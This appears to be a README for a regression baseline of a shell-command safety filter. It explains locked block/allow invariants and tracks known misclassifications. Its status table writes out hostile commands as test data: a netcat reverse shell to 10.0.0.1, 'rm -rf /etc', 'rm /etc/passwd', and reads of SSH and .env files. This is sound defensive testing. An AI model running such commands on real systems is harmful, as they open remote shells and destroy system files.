# Baseline & regression safety net (Stage 0)

This directory is the safety net for the hardening work. It captures how the
project behaves **before** any changes, so every later stage can be proven to be
an improvement and nothing silently regresses.

## Contents

| File | Purpose |
| --- | --- |
| `ENVIRONMENT.txt` | OS, Python, and git commit the baseline was captured at. |
| `unittest_baseline.txt` | Output of the original test suite (37 tests) before the harness was added. |
| `benchmark_baseline.json` | Original `cybershell bench-eval --json` output (28 cases). |
| `baseline_corpus.jsonl` | Curated commands tagged `lock_block`, `lock_allow`, or `known_issue`. |
| `behavior_snapshot.json` | Frozen decision/level/score/rules for every corpus command. |

The snapshot tool lives at `../tools/baseline_snapshot.py`; the invariant test at
`../tests/test_baseline_regression.py`.

## The three corpus categories

- **`lock_block`** — must `block` now and after every future stage. Hard invariant.
- **`lock_allow`** — must `allow` now and after every future stage. Hard invariant.
- **`known_issue`** — current behavior is wrong on purpose. Each entry records its
  `current_decision`, the `target_decision` it should become, and the `target_stage`
  that fixes it. These document the bugs so they cannot be fixed silently or forgotten.

## How it is used in each stage

```bash
# See whether anything moved since the last snapshot:
PYTHONPATH=src python tools/baseline_snapshot.py --check

# Run the full suite, including the invariant tests:
PYTHONPATH=src python -m unittest discover -s tests

# After intentionally changing behavior (e.g. fixing a known_issue) and reviewing
# the diff, re-baseline so the snapshot reflects the new, correct behavior:
PYTHONPATH=src python tools/baseline_snapshot.py --generate
```

`--check` fails (exit 1) only if a `lock_block`/`lock_allow` invariant drifts — a real
regression. Changes to `known_issue` entries are reported as **expected progress**, not
failures.

## Known-issue lifecycle

When a stage fixes a `known_issue`:

1. Confirm the new behavior matches its `target_decision`.
2. Promote the entry to `lock_block` or `lock_allow` and update its `note`.
3. Re-run `--generate` to refresh the snapshot.

From that point the corrected behavior is itself a locked invariant, so a later stage
cannot reintroduce the bug.

## Known-issue status

Stage 1 fixed and promoted the following to locked invariants. ki07 remains the
only open known issue (scheduled for Stage 2).

| id | command | Stage 0 | now | status |
| --- | --- | --- | --- | --- |
| ki01 -> la11 | `rm -rf node_modules` | block | allow | fixed (Stage 1) |
| ki02 -> la12 | `rm -rf ./build` | block | allow | fixed (Stage 1) |
| ki03 -> lw01 | `rm -rf /tmp/mycache` | block | warn | fixed (Stage 1) |
| ki04 -> la13 | `ls -la ~/.ssh/authorized_keys` | warn | allow | fixed (Stage 1) |
| ki05 -> la14 | `cat notes.environment` | warn | allow | fixed (Stage 1) |
| ki06 -> la15 | `stat deploy.env.example` | warn | allow | fixed (Stage 1) |
| ki08 -> lb12 | `nc -e /bin/bash 10.0.0.1 4444` | allow | block | fixed (Stage 1) |
| ki07 | base64-encoded reverse shell | allow | allow | **open — Stage 2** |

New locked cases added while fixing the above: lb13 (`rm -rf /etc`), lb14
(`rm /etc/passwd`), and lw02 (`cat .env` still warns).

